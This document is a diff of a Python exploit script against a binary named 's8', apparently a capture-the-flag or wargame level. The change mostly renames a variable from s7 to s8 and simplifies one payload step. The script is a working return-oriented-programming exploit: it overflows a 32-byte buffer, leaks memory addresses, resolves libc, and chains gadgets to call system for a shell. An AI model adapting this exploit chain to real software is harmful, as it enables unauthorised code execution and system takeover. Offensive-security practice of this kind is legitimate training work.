@@ -33,11 +33,11 @@ def rop(*args):
 libc_map = LibcMap()
 
 setup = binexpect.setup("./s8")
-s7 = setup.target()
-s7.setecho(False)
+s8 = setup.target()
+s8.setecho(False)
 
-s7.tryexpect("Welcome Stranger")
-s7.tryexpect("What is your password\?")
+s8.tryexpect("Welcome Stranger")
+s8.tryexpect("What is your password\?")
 
 def leak(address):
     payload = bytes('A' * 32, 'utf-8')
@@ -47,7 +47,7 @@ def leak(address):
         0x00400630, # read@main
         )    
 
-    s7.sendbin(payload)
+    s8.sendbin(payload)
     
     payload = rop(
         0x00400703, # pop rdi; ret;
@@ -59,7 +59,7 @@ def leak(address):
         )
     
 
-    s7.sendbin(payload)
+    s8.sendbin(payload)
 
     payload = bytes('A' * 32, 'utf-8')
 
@@ -68,9 +68,9 @@ def leak(address):
         0x00400630, # read@main
         )    
 
-    s7.sendbinline(payload)
+    s8.sendbinline(payload)
 
-    s7.tryexpect("If you're cool you'll get a shell.\n"
+    s8.tryexpect("If you're cool you'll get a shell.\n"
                  "If you're cool you'll get a shell.\n"
                  "(.*)\n"
                  "Welcome Stranger\n"
@@ -82,12 +82,12 @@ def leak(address):
                   exitwithprogram=False
                  )
 
-    if s7.match != None:
-        result = s7.match.group(1)
+    if s8.match != None:
+        result = s8.match.group(1)
     else:
         result = ""
 
-    if not s7.isalive():
+    if not s8.isalive():
         print("died leaking address: " + hex(address))
         raise 
 
@@ -218,7 +218,7 @@ def execute_shell(system_addr):
         0x00400630, # read@main
         )    
 
-    s7.sendbin(payload)
+    s8.sendbin(payload)
     
     payload = rop(
         0x00400703, # pop rdi; ret;
@@ -230,18 +230,9 @@ def execute_shell(system_addr):
         )
     
 
-    s7.sendbin(payload)
+    s8.sendbinline(payload)
 
-    payload = bytes('A' * 32, 'utf-8')
-
-    payload += rop(
-        0x00601718, # frame pointer
-        0x00400630, # read@main
-        )    
-
-    s7.sendbinline(payload)
-
-    s7.tryexpect("If you're cool you'll get a shell.\n"
+    s8.tryexpect("If you're cool you'll get a shell.\n"
                  "If you're cool you'll get a shell.\n" )
 
 
@@ -296,7 +287,7 @@ while True:
     execute_shell(system + libc_base)
 
 
-    s7.pwned()
+    s8.pwned()
 
     break
     
